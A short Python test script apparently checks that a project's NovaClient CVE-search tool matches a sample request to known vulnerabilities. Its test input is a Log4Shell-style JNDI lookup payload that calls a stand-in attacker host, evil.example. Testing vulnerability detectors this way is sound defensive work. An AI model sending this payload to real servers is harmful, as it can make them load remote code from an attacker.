from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.core.nova_client import NovaClient


def main() -> None:
    payload = "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim"
    client = NovaClient(force_demo_index=True)
    results = client.search(payload, top_k=3)
    print({"payload": payload, "results": results})
    assert results, "expected at least one CVE candidate"
    assert results[0]["cve"].startswith("CVE-")


if __name__ == "__main__":
    main()
